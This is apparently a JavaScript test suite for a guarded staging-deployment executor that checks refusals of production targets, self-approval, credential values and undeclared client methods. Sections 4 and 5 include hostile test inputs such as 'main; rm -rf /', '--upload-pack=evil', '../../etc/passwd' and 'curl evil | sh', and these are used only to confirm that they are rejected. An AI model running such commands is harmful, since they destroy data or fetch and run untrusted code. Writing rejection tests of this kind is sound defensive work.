'use strict';
// =====================================================
// MYTHOS — Stage INF-DEPLOY-AUTO-0 staging deployment tests
// tests/inf-deploy-auto-0-staging-test.js
//
// Deterministic and fully offline. No live credential, no network call, no
// deployment. The Coolify client is always a mock and "deployed state" is a
// plain object. The real committed automation config is read so the gates are
// tested against the repository's actual state, not a convenient fixture.
//
// Run with: node tests/inf-deploy-auto-0-staging-test.js
// =====================================================

var fs = require('fs');
var path = require('path');
var BASE = path.join(__dirname, '..');
var pass = 0, fail = 0;
function ok(v, l) { if (v) { pass++; console.log('  PASS ' + l); } else { fail++; console.log('  FAIL ' + l); } }
function throwsWith(fn, re, l) {
  try { fn(); fail++; console.log('  FAIL ' + l + ' (expected a refusal)'); }
  catch (e) {
    if (e.refused === true && re.test(e.message)) { pass++; console.log('  PASS ' + l); }
    else { fail++; console.log('  FAIL ' + l + ' [got: ' + e.message + ']'); }
  }
}
function rejects(p, re, l) {
  return p.then(
    function () { fail++; console.log('  FAIL ' + l + ' (expected a refusal, but it resolved)'); },
    function (e) {
      if (e.refused === true && re.test(e.message)) { pass++; console.log('  PASS ' + l); }
      else { fail++; console.log('  FAIL ' + l + ' [got: ' + (e && e.message) + ']'); }
    }
  );
}

var EXEC_PATH = path.join(BASE, 'projects', 'automation', 'reference', 'staging-deployment-executor.js');
var exec = require(EXEC_PATH);
var AUT_CONFIG = JSON.parse(fs.readFileSync(path.join(BASE, 'projects', 'automation', 'config', 'automation.example.json'), 'utf8'));
var CATALOGUE = AUT_CONFIG.connector_catalogue.infrastructure;

var RUN = 'run-deploy-001';
var APP = 'coolify-app-staging-7';
var ENV_ID = 'env-staging-1';
var REPO = exec.AUTHORISED_REPOSITORY;

function stagingEnv(over) {
  return Object.assign({
    environment_id: ENV_ID, environment_key: 'staging', display_name: 'Mythos Staging',
    risk_class: 'STANDARD', is_production: false, enabled: true
  }, over || {});
}
function platform(over) {
  return Object.assign({ application_id: APP, environment_name: 'staging' }, over || {});
}
function approvalRecord(over) {
  return Object.assign({
    approval_id: 'apr-d1', run_id: RUN, decision: 'APPROVE', decided_by_ref: 'owner-ref-A',
    is_self_approval: false, expires_at: '2099-01-01T00:00:00Z'
  }, over || {});
}
function approvalPolicy(over) {
  return Object.assign({
    approval_policy_id: 'pol-d1', policy_key: 'staging_deployment', required_approval_count: 1,
    allow_self_approval: false, minimum_automation_level_covered: 'LEVEL_3_APPROVAL_REQUIRED',
    is_permanent_boundary: false, enabled: true
  }, over || {});
}
// A hypothetical fully-configured world. None of this exists in the
// repository — section 11 proves that against the real config.
function enabledCatalogue() {
  return CATALOGUE.map(function (c) {
    return c.connector_id === 'coolify_deployer'
      ? Object.assign({}, c, { enabled: true, capabilities: ['deployment.trigger.staging', 'service.read'] })
      : c;
  });
}
function liveFlags(over) {
  return Object.assign({ level_3_approval_required_runs: true, connector_coolify_deployer_live: true }, over || {});
}
function mockClient(state, opts) {
  opts = opts || {};
  return {
    triggerStagingDeployment: function (env) {
      if (opts.applyThrows && state.calls.length >= 1) return Promise.reject(new Error('coolify unavailable'));
      state.calls.push(env);
      state.revision = opts.deploysWrong && state.calls.length === 1 ? 'deadbeef' : env.ref;
      return Promise.resolve({ ok: true });
    },
    readDeployedRevision: function () { return Promise.resolve(state.revision); }
  };
}
function baseRequest(over) {
  var state = { calls: [], revision: null };
  return Object.assign({
    _state: state,
    runId: RUN, repository: REPO, ref: 'main', rollbackRevision: 'v1.0.0',
    target: { application_id: APP, environment_id: ENV_ID },
    environment: stagingEnv(), platformReported: platform(),
    connector: { connector_id: 'coolify_deployer', secret_reference_id: 'secref-coolify-1' },
    connectorCatalogue: enabledCatalogue(), featureFlags: liveFlags(),
    allowedClientMethods: ['triggerStagingDeployment', 'readDeployedRevision'],
    client: mockClient(state),
    approval: approvalRecord(), approvalPolicy: approvalPolicy(),
    requestedByRef: 'operator-ref-B', now: '2026-08-15T12:00:00Z'
  }, over || {});
}

(async function main() {

console.log('\n1. STAGING IS A CONSTANT — production is not selectable');
(function () {
  ok(exec.ENVIRONMENT_KEY === 'staging',
    '1 the environment key is the constant "staging"');
  var src = fs.readFileSync(EXEC_PATH, 'utf8');
  var body = src.replace(/\/\/[^\n]*\n/g, '\n').replace(/\/\*[\s\S]*?\*\//g, '');
  ok(!/ENVIRONMENT_KEY\s*=\s*[^;]*(request|config|opts|input|process\.env)/.test(body),
    '2 the environment key is never derived from input, config or environment — it cannot be reassigned by a caller');
  // Every occurrence of "promote" must sit inside the refusal guard — the
  // word may appear only where promotion is being REJECTED, never performed.
  var promoteLines = body.split('\n').filter(function (l) { return /promote/i.test(l); });
  ok(promoteLines.length > 0 && promoteLines.every(function (l) {
    return /promoteTo|PRODUCTION_PROMOTION_FORBIDDEN|promotion mechanism/.test(l);
  }), '3 the only mention of promotion is the guard that refuses it — no promotion mechanism exists (O-DEPLOY-2)');
})();
await rejects(exec.dryRun(baseRequest({ environmentKeyOverride: 'production' })),
  /PRODUCTION_PROMOTION_FORBIDDEN/, '4 an environment override parameter does not exist and is refused');
await rejects(exec.dryRun(baseRequest({ promoteTo: 'production' })),
  /PRODUCTION_PROMOTION_FORBIDDEN/, '5 a promote-to-production parameter is refused before anything else runs');
await rejects(exec.dryRun(baseRequest({ targetEnvironment: 'production' })),
  /PRODUCTION_PROMOTION_FORBIDDEN/, '6 an alternate environment selector is refused');

console.log('\n2. THE TWO-SOURCE STAGING PROOF');
(function () {
  ok(exec.assertTargetIsStaging({ target: { application_id: APP, environment_id: ENV_ID },
      environment: stagingEnv(), platformReported: platform() }).proof === 'declared+platform',
    '7 a target passes only when the declared record AND the platform both say staging');
  throwsWith(function () {
    exec.assertTargetIsStaging({ target: { application_id: APP, environment_id: ENV_ID },
      environment: stagingEnv(), platformReported: platform({ environment_name: 'production' }) });
  }, /PLATFORM_REPORTS_PRODUCTION/,
    '8 THE REAL CONDITION ON THIS HOST: a declared-staging target whose platform reports production is REFUSED');
  throwsWith(function () {
    exec.assertTargetIsStaging({ target: { application_id: APP, environment_id: ENV_ID },
      environment: stagingEnv(), platformReported: platform({ environment_name: 'preprod' }) });
  }, /ENVIRONMENT_PROOF_DISAGREEMENT/,
    '9 any disagreement between the two sources is a refusal, never resolved in favour of the permissive one');
  throwsWith(function () {
    exec.assertTargetIsStaging({ target: { application_id: APP, environment_id: ENV_ID }, environment: stagingEnv() });
  }, /PLATFORM_ENVIRONMENT_UNVERIFIED/,
    '10 an unverified target is never assumed staging — the platform must independently confirm');
  throwsWith(function () {
    exec.assertTargetIsStaging({ target: { application_id: APP, environment_id: ENV_ID },
      environment: stagingEnv(), platformReported: platform({ environment_name: '' }) });
  }, /PLATFORM_ENVIRONMENT_UNVERIFIED/, '11 an empty platform environment name proves nothing');
  throwsWith(function () {
    exec.assertTargetIsStaging({ target: { application_id: 'other-app', environment_id: ENV_ID },
      environment: stagingEnv(), platformReported: platform() });
  }, /PLATFORM_TARGET_MISMATCH/, '12 the platform must be reporting about the SAME application');
  throwsWith(function () {
    exec.assertTargetIsStaging({ target: { application_id: APP, environment_id: 'env-other' },
      environment: stagingEnv(), platformReported: platform() });
  }, /TARGET_ENVIRONMENT_MISMATCH/, '13 a target bound to a different environment than the declared one is refused');
  // An image tag is not evidence. Two identical requests differing only by a
  // "staging"-looking name still refuse when the platform says production.
  throwsWith(function () {
    exec.assertTargetIsStaging({ target: { application_id: APP, environment_id: ENV_ID, image: 'mythos-staging-app:local' },
      environment: stagingEnv(), platformReported: platform({ environment_name: 'production' }) });
  }, /PLATFORM_REPORTS_PRODUCTION/,
    '14 a "mythos-staging" image tag does NOT make a production-labelled application staging');
})();

console.log('\n3. DECLARED ENVIRONMENT RECORD');
(function () {
  ok(exec.assertStagingEnvironment(stagingEnv()).environment_key === 'staging', '15 a valid staging record passes');
  throwsWith(function () { exec.assertStagingEnvironment(stagingEnv({ environment_key: 'production' })); },
    /ENVIRONMENT_NOT_STAGING/, '16 a production environment record is refused');
  throwsWith(function () { exec.assertStagingEnvironment(stagingEnv({ environment_key: 'sandbox' })); },
    /ENVIRONMENT_NOT_STAGING/, '17 any environment other than staging is refused, including a harmless-sounding one');
  throwsWith(function () { exec.assertStagingEnvironment(stagingEnv({ is_production: true })); },
    /ENVIRONMENT_FLAGGED_PRODUCTION/,
    '18 a record claiming environment_key=staging while flagged is_production=true is refused — the two are checked independently');
  throwsWith(function () { exec.assertStagingEnvironment(stagingEnv({ is_production: 'false' })); },
    /ENVIRONMENT_FLAGGED_PRODUCTION/, '19 is_production must be exactly false, not a truthy-looking string');
  throwsWith(function () { exec.assertStagingEnvironment(stagingEnv({ enabled: false })); },
    /ENVIRONMENT_DISABLED/, '20 a disabled environment is refused');
  throwsWith(function () { exec.assertStagingEnvironment(null); },
    /ENVIRONMENT_RECORD_REQUIRED/, '21 a missing environment record is refused, never defaulted');
  ok(exec.looksProduction('production') && exec.looksProduction('prod') && exec.looksProduction('mythos-prod') &&
     exec.looksProduction('app_production') && !exec.looksProduction('staging'),
    '22 production detection catches the realistic spellings without flagging staging');
})();

console.log('\n4. SOURCE SCOPE — repository, ref, git operations (O-DEPLOY-3)');
(function () {
  ok(exec.assertSourceScope({ repository: REPO, ref: 'main', operation: 'read' }).ref === 'main',
    '23 the authorised Mythos repository with a safe ref passes');
  throwsWith(function () { exec.assertSourceScope({ repository: 'someone/other-repo', ref: 'main' }); },
    /REPOSITORY_NOT_AUTHORISED/, '24 an unrelated repository is refused');
  throwsWith(function () { exec.assertSourceScope({ repository: REPO, ref: 'main', operation: 'force_push' }); },
    /GIT_OPERATION_FORBIDDEN/, '25 force push is prohibited');
  throwsWith(function () { exec.assertSourceScope({ repository: REPO, ref: 'main', operation: 'history_rewrite' }); },
    /GIT_OPERATION_FORBIDDEN/, '26 history rewrite is prohibited');
  throwsWith(function () { exec.assertSourceScope({ repository: REPO, ref: 'main', operation: 'sudo' }); },
    /GIT_OPERATION_UNKNOWN/, '27 an unknown git operation fails closed');
  throwsWith(function () { exec.assertSourceScope({ repository: REPO, ref: '../../etc/passwd' }); },
    /GIT_REF_INVALID/, '28 path traversal in a git ref is refused');
  throwsWith(function () { exec.assertSourceScope({ repository: REPO, ref: 'main; rm -rf /' }); },
    /GIT_REF_INVALID/, '29 command injection in a git ref is refused');
  throwsWith(function () { exec.assertSourceScope({ repository: REPO, ref: '--upload-pack=evil' }); },
    /GIT_REF_INVALID/, '30 option injection in a git ref is refused');
  throwsWith(function () { exec.assertSourceScope({ repository: REPO, ref: '' }); },
    /GIT_REF_INVALID/, '31 an empty ref is refused');
  ok(exec.FORBIDDEN_GIT_OPERATIONS.indexOf('force_push') !== -1 &&
     exec.FORBIDDEN_GIT_OPERATIONS.indexOf('history_rewrite') !== -1,
    '32 the forbidden git operations named by O-DEPLOY-3 are declared');
})();

console.log('\n5. NO ARBITRARY EXECUTION, NO ENV SMUGGLING');
await rejects(exec.dryRun(baseRequest({ command: 'rm -rf /' })),
  /ARBITRARY_COMMAND_REFUSED/, '33 an arbitrary command is refused — this stage triggers a declared deployment only');
await rejects(exec.dryRun(baseRequest({ script: 'curl evil | sh' })),
  /ARBITRARY_COMMAND_REFUSED/, '34 an arbitrary script is refused');
await rejects(exec.dryRun(baseRequest({ env: { DATABASE_URL: 'postgres://x' } })),
  /ENVIRONMENT_SMUGGLING_REFUSED/, '35 environment-variable smuggling into the deployment is refused');
await rejects(exec.dryRun(baseRequest({ environmentVariables: { A: 'b' } })),
  /ENVIRONMENT_SMUGGLING_REFUSED/, '36 the alternate env-var spelling is refused too');

console.log('\n6. CONNECTOR BOUNDARY (O-DEPLOY-3)');
(function () {
  var base = {
    connector: { connector_id: 'coolify_deployer', secret_reference_id: 'secref-1' },
    client: { triggerStagingDeployment: function () {}, readDeployedRevision: function () {} },
    catalogue: enabledCatalogue(), featureFlags: liveFlags(),
    allowedClientMethods: ['triggerStagingDeployment', 'readDeployedRevision']
  };
  ok(exec.assertDeployConnector(base).connector_id === 'coolify_deployer', '37 the authorised connector passes');
  throwsWith(function () { exec.assertDeployConnector(Object.assign({}, base, { catalogue: CATALOGUE })); },
    /CONNECTOR_DISABLED/, '38 the REAL catalogue has coolify_deployer disabled — refused');
  throwsWith(function () {
    exec.assertDeployConnector(Object.assign({}, base, {
      catalogue: CATALOGUE.map(function (c) { return c.connector_id === 'coolify_deployer' ? Object.assign({}, c, { enabled: true }) : c; })
    }));
  }, /STAGING_CAPABILITY_NOT_GRANTED/,
    '39 the real catalogue grants only environment-agnostic deployment.trigger — a staging-scoped grant is mandatory');
  throwsWith(function () {
    exec.assertDeployConnector(Object.assign({}, base, { featureFlags: liveFlags({ connector_coolify_deployer_live: false }) }));
  }, /CONNECTOR_NOT_LIVE/, '40 a connector whose live flag is false is refused');
  throwsWith(function () {
    exec.assertDeployConnector(Object.assign({}, base, { featureFlags: liveFlags({ level_3_approval_required_runs: false }) }));
  }, /LEVEL_3_RUNS_DISABLED/, '41 LEVEL_3 runs globally disabled refuses the deployment');
  throwsWith(function () {
    exec.assertDeployConnector(Object.assign({}, base, { connector: { connector_id: 'github_repository', secret_reference_id: 's' } }));
  }, /CONNECTOR_NOT_AUTHORISED/, '42 no connector other than coolify_deployer may deploy');
  throwsWith(function () {
    exec.assertDeployConnector(Object.assign({}, base, {
      catalogue: enabledCatalogue().map(function (c) {
        return c.connector_id === 'coolify_deployer'
          ? Object.assign({}, c, { capabilities: ['deployment.trigger.staging', 'deployment.trigger.production'] }) : c;
      })
    }));
  }, /PRODUCTION_CAPABILITY_PRESENT/,
    '43 a connector carrying ANY production capability is refused outright — no production capability in this stage');
  throwsWith(function () {
    exec.assertDeployConnector(Object.assign({}, base, { connector: { connector_id: 'coolify_deployer' } }));
  }, /CREDENTIAL_REFERENCE_MISSING/, '44 a connector with no credential reference is refused');
  throwsWith(function () {
    exec.assertDeployConnector(Object.assign({}, base, {
      connector: { connector_id: 'coolify_deployer', secret_reference_id: 's', api_token: 'zzz' }
    }));
  }, /CREDENTIAL_VALUE_PRESENT/, '45 a connector carrying an actual credential value is refused — references only');
  throwsWith(function () {
    exec.assertDeployConnector(Object.assign({}, base, {
      client: { triggerStagingDeployment: function () {}, readDeployedRevision: function () {}, deleteApplication: function () {} }
    }));
  }, /CONNECTOR_SCOPE_ESCAPE.*deleteApplication/, '46 a client exposing an undeclared method cannot escape scope');
})();

console.log('\n7. APPROVAL BOUNDARY');
(function () {
  var base = { approval: approvalRecord(), policy: approvalPolicy(), runId: RUN, requestedByRef: 'operator-ref-B' };
  ok(exec.assertApproval(base).approver === 'owner-ref-A', '47 a valid approval passes');
  throwsWith(function () { exec.assertApproval(Object.assign({}, base, { approval: approvalRecord({ decision: 'REJECT' }) })); },
    /APPROVAL_NOT_GRANTED/, '48 a rejected decision cannot deploy');
  throwsWith(function () { exec.assertApproval(Object.assign({}, base, { approval: approvalRecord({ is_self_approval: true }) })); },
    /SELF_APPROVAL_REJECTED/, '49 self-approval is refused');
  throwsWith(function () { exec.assertApproval(Object.assign({}, base, { approval: approvalRecord({ decided_by_ref: 'operator-ref-B' }) })); },
    /SELF_APPROVAL_REJECTED.*same reference/, '50 requester and approver may not be the same');
  throwsWith(function () { exec.assertApproval(Object.assign({}, base, { approval: approvalRecord({ expires_at: '2026-01-01T00:00:00Z' }), now: '2026-08-15T00:00:00Z' })); },
    /APPROVAL_EXPIRED/, '51 an expired approval is refused');
  throwsWith(function () { exec.assertApproval(Object.assign({}, base, { approval: approvalRecord({ run_id: 'other' }) })); },
    /APPROVAL_RUN_MISMATCH/, '52 an approval from another run cannot be reused');
  throwsWith(function () { exec.assertApproval(Object.assign({}, base, { policy: approvalPolicy({ allow_self_approval: true }) })); },
    /SELF_APPROVAL_PERMITTED_BY_POLICY/, '53 a policy permitting self-approval is refused');
  throwsWith(function () { exec.assertApproval(Object.assign({}, base, { policy: approvalPolicy({ minimum_automation_level_covered: 'LEVEL_4_FULL_AUTOMATIC' }) })); },
    /APPROVAL_LEVEL_INSUFFICIENT/, '54 a policy not covering LEVEL_3 is insufficient — never LEVEL_4 (no release policy exists)');
  throwsWith(function () { exec.assertApproval(Object.assign({}, base, { policy: approvalPolicy({ enabled: false }) })); },
    /APPROVAL_POLICY_DISABLED/, '55 a disabled policy authorises nothing');
})();
await rejects(exec.dryRun(baseRequest({ approval: approvalRecord({ decision: 'REJECT' }) })),
  /APPROVAL_NOT_GRANTED/, '56 a rejected approval blocks the deployment end to end');

console.log('\n8. PLAN, ROLLBACK AND DETERMINISM');
(function () {
  var plan = exec.buildDeploymentPlan({ repository: REPO, ref: 'main', rollbackRevision: 'v1.0.0',
    target: { application_id: APP } });
  ok(plan.authorises_execution === false && plan.execution_level === 'LEVEL_3_APPROVAL_REQUIRED',
    '57 the plan authorises nothing and declares LEVEL_3 for execution');
  ok(plan.environment_key === 'staging' && plan.rollback.restore_to_revision === 'v1.0.0',
    '58 the plan is staging-scoped and names the concrete revision it would roll back to');
  ok(plan.steps.some(function (s) { return s.kind === 'staging_verify'; }),
    '59 verification is part of the plan, not optional');
  throwsWith(function () { exec.buildDeploymentPlan({ repository: REPO, ref: 'main', target: { application_id: APP } }); },
    /ROLLBACK_REVISION_REQUIRED/, '60 a deployment whose rollback target is unknown is refused at plan time');
  throwsWith(function () { exec.buildDeploymentPlan({ repository: REPO, ref: 'main', rollbackRevision: '../etc', target: {} }); },
    /ROLLBACK_REVISION_INVALID/, '61 an unsafe rollback revision is refused');
  var a = exec.buildDeploymentPlan({ repository: REPO, ref: 'main', rollbackRevision: 'v1', target: { application_id: APP } });
  var b = exec.buildDeploymentPlan({ repository: REPO, ref: 'main', rollbackRevision: 'v1', target: { application_id: APP } });
  ok(JSON.stringify(a) === JSON.stringify(b), '62 planning is deterministic');
})();

console.log('\n9. DRY RUN AND EXECUTION');
await (async function () {
  var dreq = baseRequest();
  var dry = await exec.dryRun(dreq);
  ok(dry.mutations_performed === 0 && dry.deployments_performed === 0 && dry.terminated_before === 'APPLY',
    '63 the dry run performs no deployment and stops before APPLY');
  ok(dreq._state.calls.length === 0 && dreq._state.revision === null,
    '64 the dry run touched the Coolify client zero times');
  var ereq = baseRequest();
  var out = await exec.executeStagingDeployment(ereq);
  ok(out.status === 'SUCCEEDED' && out.deployments_performed === 1 && out.verified === true,
    '65 a fully-approved, fully-proven staging deployment executes once and verifies');
  ok(JSON.stringify(dry.envelope) === JSON.stringify(out.envelope),
    '66 the dry-run envelope is byte-identical to the executed one');
  ok(ereq._state.calls.length === 1 && ereq._state.calls[0].environment_key === 'staging',
    '67 exactly one deployment call was made, and it was staging-scoped');
  ok(out.audit_events.length === 3 &&
     out.audit_events.map(function (a) { return a.event_type; }).join(',') ===
       'staging_deploy_approved,staging_deploy_applied,staging_deploy_verified',
    '68 the successful deployment is auditable end to end');

  var st = { calls: [], revision: null };
  var rreq = baseRequest({ client: mockClient(st, { deploysWrong: true }) });
  rreq._state = st;
  var rolled = await exec.executeStagingDeployment(rreq);
  ok(rolled.status === 'ROLLED_BACK' && rolled.verified === false,
    '69 a failed verification triggers the rollback automatically');
  ok(st.calls.length === 2 && st.calls[1].ref === 'v1.0.0' && st.calls[1].operation === 'staging_rollback',
    '70 the rollback redeployed the captured previous revision, and nothing else');
  ok(rolled.audit_events.some(function (a) { return a.event_type === 'rollback_executed'; }),
    '71 the rollback is auditable');

  var st2 = { calls: [], revision: null };
  var freq = baseRequest({ client: mockClient(st2, { deploysWrong: true, applyThrows: true }) });
  await rejects(exec.executeStagingDeployment(freq),
    /ROLLBACK_FAILED_CRITICAL_INCIDENT/, '72 a failed rollback raises a CRITICAL incident, not a routine failure');
})();

console.log('\n10. SECRET HYGIENE AND AUDIT');
await (async function () {
  var dry = await exec.dryRun(baseRequest());
  var blob = JSON.stringify(dry);
  ok(blob.indexOf('secref-coolify-1') !== -1 && !/api_?token|api_?key|password|private_key/i.test(blob),
    '73 the envelope carries a secret REFERENCE and no credential value anywhere');
  throwsWith(function () { exec.assertNoSecrets({ deep: { nested: { api_token: 'zzz' } } }); },
    /CREDENTIAL_VALUE_PRESENT.*api_token/, '74 a credential value nested at any depth is caught');
  throwsWith(function () { exec.buildAuditEvent({ auditEventId: 'a', eventType: 'x', runId: RUN, actorRef: 'r', actorType: 'SYSTEM' }); },
    /AUDIT_FIELD_MISSING/, '75 an incomplete audit record is refused');
  throwsWith(function () { exec.buildAuditEvent({ auditEventId: 'a', eventType: 'x', runId: RUN, actorRef: 'r', actorType: 'BOT', eventSummary: 's', occurredAt: 'now' }); },
    /AUDIT_ACTOR_TYPE_INVALID/, '76 an invalid audit actor type is refused');
  ok(exec.buildAuditEvent({ auditEventId: 'a', eventType: 'x', runId: RUN, actorRef: 'r', actorType: 'SYSTEM',
      eventSummary: 'y'.repeat(700), occurredAt: 'now' }).event_summary.length === 512,
    '77 an audit summary is truncated to the column width');
  ok(dry.envelope.idempotency_key === (await exec.dryRun(baseRequest())).envelope.idempotency_key,
    '78 the idempotency key is deterministic — a retry does not re-deploy');
  ok(/^lock-/.test(dry.envelope.resource_lock_key),
    '79 a resource lock key scopes the application against concurrent deployments');
})();

console.log('\n11. AGAINST THE REAL REPOSITORY AND HOST STATE');
await (async function () {
  await rejects(exec.dryRun(baseRequest({ connectorCatalogue: CATALOGUE, featureFlags: AUT_CONFIG.feature_flags })),
    /CONNECTOR_DISABLED|CONNECTOR_NOT_LIVE|LEVEL_3_RUNS_DISABLED/,
    '80 against the REAL committed config, even a dry run refuses — the connector is disabled and every flag is false');
  ok(CATALOGUE.filter(function (c) { return c.connector_id === 'coolify_deployer'; })[0].enabled === false,
    '81 coolify_deployer is disabled in the committed catalogue');
  ok(CATALOGUE.filter(function (c) { return c.connector_id === 'coolify_deployer'; })[0]
      .capabilities.indexOf('deployment.trigger.staging') === -1,
    '82 the committed catalogue grants no staging-scoped deployment capability — required before any deployment');
  ok(AUT_CONFIG.feature_flags.connector_coolify_deployer_live === false &&
     AUT_CONFIG.feature_flags.level_3_approval_required_runs === false,
    '83 the committed feature flags block deployment independently');
  // The exact host condition: an application whose images say staging but
  // whose platform environment says production.
  await rejects(exec.dryRun(baseRequest({ platformReported: platform({ environment_name: 'production' }) })),
    /PLATFORM_REPORTS_PRODUCTION/,
    '84 the observed host condition (staging-tagged images on a production-labelled Coolify app) refuses');
})();

console.log('\n11b. COOLIFY ENVIRONMENT REGISTRY — the real committed record');
(function () {
  var REG = JSON.parse(fs.readFileSync(
    path.join(BASE, 'projects', 'infrastructure', 'coolify', 'environments.json'), 'utf8'));

  var resolved = exec.environmentFromRegistry(REG, 'darhijama');
  ok(resolved.environment.environment_key === 'staging' &&
     resolved.environment.is_production === false &&
     resolved.environment.environment_id === 'nuzp80tn6vtmymwnm2tc4d6i',
    '91 the committed registry resolves darhijama to the real staging environment uuid');
  ok(resolved.environment.environment_id === REG.authorised_staging_environment_id,
    '92 the resolved environment is the one the registry authorises');
  // The decisive current fact: a declared environment is not a deployment target.
  ok(resolved.target === null && resolved.deployable === false && resolved.application_count_observed === 0,
    '93 darhijama/staging is authorised but EMPTY — 0 applications, so no deployment target exists and none is invented');

  throwsWith(function () { exec.environmentFromRegistry(REG, 'notrejour'); },
    /NO_STAGING_ENVIRONMENT_DECLARED/, '94 a project with no staging environment is refused, never falling back to its production one');
  ok(REG.environments.filter(function (e) { return e.is_production === true; }).length === 2 &&
     REG.environments.filter(function (e) { return e.is_production === true; })
       .every(function (e) { return e.enabled === false; }),
    '95 every production entry in the registry is recorded is_production=true AND enabled=false — excluded on two independent grounds');
  REG.environments.filter(function (e) { return e.is_production === true; }).forEach(function (e) {
    throwsWith(function () { exec.assertStagingEnvironment(e); },
      /ENVIRONMENT_NOT_STAGING|ENVIRONMENT_FLAGGED_PRODUCTION/,
      '96 the registry\'s production entry "' + e.display_name + '" is refused by the staging gate');
  });

  // A tampered registry cannot manufacture a staging target.
  var forged = JSON.parse(JSON.stringify(REG));
  forged.environments.filter(function (e) { return e.environment_key === 'production'; })[0].environment_key = 'staging';
  forged.environments.filter(function (e) { return e.environment_key === 'staging' && e.is_production === true; })
    .forEach(function (e) { e.coolify_project_name = 'darhijama'; });
  throwsWith(function () { exec.environmentFromRegistry(forged, 'darhijama'); },
    /AMBIGUOUS_STAGING_ENVIRONMENT/,
    '97 relabelling a production entry as staging produces ambiguity and is refused, not resolved by picking one');

  var relabelled = JSON.parse(JSON.stringify(REG));
  relabelled.environments = [Object.assign({}, relabelled.environments[1],
    { environment_key: 'staging', coolify_project_name: 'darhijama' })];
  relabelled.authorised_staging_environment_id = relabelled.environments[0].environment_id;
  throwsWith(function () { exec.environmentFromRegistry(relabelled, 'darhijama'); },
    /ENVIRONMENT_FLAGGED_PRODUCTION/,
    '98 a production environment relabelled staging is still refused — is_production is checked independently of the key');

  var mismatched = JSON.parse(JSON.stringify(REG));
  mismatched.authorised_staging_environment_id = 'some-other-uuid';
  throwsWith(function () { exec.environmentFromRegistry(mismatched, 'darhijama'); },
    /REGISTRY_AUTHORISATION_MISMATCH/, '99 a registry whose authorised id disagrees with its own entry is refused');
  throwsWith(function () { exec.environmentFromRegistry({}, 'darhijama'); },
    /ENVIRONMENT_REGISTRY_REQUIRED/, '100 a malformed registry document is refused');
  throwsWith(function () { exec.environmentFromRegistry(REG, ''); },
    /REGISTRY_PROJECT_REQUIRED/, '101 a registry lookup without a project is refused');

  var bound = JSON.parse(JSON.stringify(REG));
  bound.environments.filter(function (e) { return e.environment_key === 'staging'; })[0].bound_application_id = 'app-uuid-1';
  var withTarget = exec.environmentFromRegistry(bound, 'darhijama');
  ok(withTarget.deployable === true && withTarget.target.application_id === 'app-uuid-1' &&
     withTarget.target.environment_id === 'nuzp80tn6vtmymwnm2tc4d6i',
    '102 once an application is bound, the adapter yields a target bound to the same staging environment');
  var badBound = JSON.parse(JSON.stringify(REG));
  badBound.environments.filter(function (e) { return e.environment_key === 'staging'; })[0].bound_application_id = '';
  throwsWith(function () { exec.environmentFromRegistry(badBound, 'darhijama'); },
    /BOUND_APPLICATION_INVALID/, '103 an empty bound application id is refused rather than treated as unbound');

  // Assert on KEYS, not prose: the file legitimately contains sentences saying
  // it holds no token or password, and a blob regex would match those.
  var keys = [];
  (function walk(v) {
    if (!v || typeof v !== 'object') return;
    Object.keys(v).forEach(function (k) { keys.push(k); walk(v[k]); });
  })(REG);
  var credentialKeys = keys.filter(function (k) {
    return /^(api[_-]?key|api[_-]?token|token|password|secret|private[_-]?key|credential|connection_string)$/i.test(k);
  });
  ok(credentialKeys.length === 0 && keys.length > 20,
    '104 no key anywhere in the committed registry is credential-shaped (' + keys.length + ' keys checked)');
  ok(exec.assertNoSecrets(REG) === true, '105 the registry passes the secret-hygiene guard');
})();

console.log('\n12. STRUCTURAL BOUNDARIES');
(function () {
  var src = fs.readFileSync(EXEC_PATH, 'utf8');
  var body = src.replace(/\/\/[^\n]*\n/g, '\n').replace(/\/\*[\s\S]*?\*\//g, '');
  var requires = (body.match(/require\('([^']+)'\)/g) || []).sort().join(',');
  ok(requires === "require('crypto')",
    '85 the executor requires only crypto — no http, no fs, no child_process, no database, no provider SDK');
  ok(!/child_process|exec\(|execSync|spawn/.test(body),
    '86 no command-execution capability exists in the module');
  ok(!/process\.env/.test(body),
    '87 no environment variable is read — a credential or target cannot be picked up implicitly');
  ok(!/fetch\(|XMLHttpRequest|WebSocket|https?:\/\/[a-z]/i.test(body),
    '88 the executor performs no network call and embeds no endpoint');
  ok(!/\b(INSERT INTO|UPDATE [a-z_]+ SET|DELETE FROM|writeFileSync)/i.test(body),
    '89 the executor performs no database or filesystem write');
  ok(exec.AUTHORISED_REPOSITORY === 'othoth77/mythos-prod',
    '90 exactly one repository is authorised (O-DEPLOY-1)');
})();

console.log('\nStage INF-DEPLOY-AUTO-0 staging deployment: ' + pass + ' passed, ' + fail + ' failed');
process.exit(fail === 0 ? 0 : 1);

})().catch(function (e) {
  console.error('SUITE ABORTED: ' + (e && e.stack || e));
  process.exit(1);
});
